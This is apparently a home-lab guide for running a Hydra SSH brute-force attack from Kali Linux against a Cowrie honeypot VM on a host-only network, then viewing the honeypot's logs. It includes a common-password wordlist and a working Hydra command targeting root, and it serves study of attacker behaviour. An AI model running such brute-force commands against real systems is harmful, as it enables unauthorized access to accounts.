# ⚙️ Project Setup: Hydra SSH Brute-Force Attack on Cowrie Honeypot

This setup guide walks through the entire process of using Hydra to perform a brute-force SSH attack against a Cowrie honeypot running on a virtual Ubuntu server.

---

## 🖥️ Virtual Environment

- **Attacker Machine:** Kali Linux VM (Hydra pre-installed)
- **Target Machine:** Ubuntu Server VM with Cowrie Honeypot
- **Network:** Both VMs set to **Host-Only Adapter** on VirtualBox for local traffic sniffing

---

## ✅ Step-by-Step Instructions

---

### 🔹 Step 1: Create Project Directory

**On Kali Linux:**

cd ~
mkdir hydra-project
cd hydra-project
[Hydra project folder created](screenshots/01_hydra_project_folder_created.png)

###🔹 Step 2: Create a Password Wordlist
Inside the hydra-project directory, run:

echo "123456" > passwords.txt
echo "password" >> passwords.txt
echo "admin" >> passwords.txt
echo "toor" >> passwords.txt
echo "cowrie" >> passwords.txt
Verify the contents:

cat passwords.txt
[Password texts created](screenshots/02_passwords_txt_created.png)

###🔹 Step 3: Run Hydra SSH Brute-Force Attack
Replace <target-ip> with the IP address of your Cowrie VM, and ensure it's listening on port 2222.

hydra -l root -P passwords.txt ssh://<target-ip>:2222
✅ Example:

hydra -l root -P passwords.txt ssh://192.168.40.83:2222
[Hydra attack success](screenshots/03_hydra_attack_success.png)

###🔹 Step 4: Check Cowrie Logs
Now switch to your Ubuntu Server VM running Cowrie.

Activate the virtual environment:

cd /home/cowrie/cowrie
source cowrie-env/bin/activate
Check Cowrie logs:

tail -f var/log/cowrie/cowrie.log
[Cowrie log verified](screenshots/04_cowrie_log_verified.png)

📝 Notes
Ensure both VMs are running and connected to the same Host-Only network.

Cowrie must be actively running before launching the Hydra attack.

Use cowrie bin/cowrie status to verify its status.

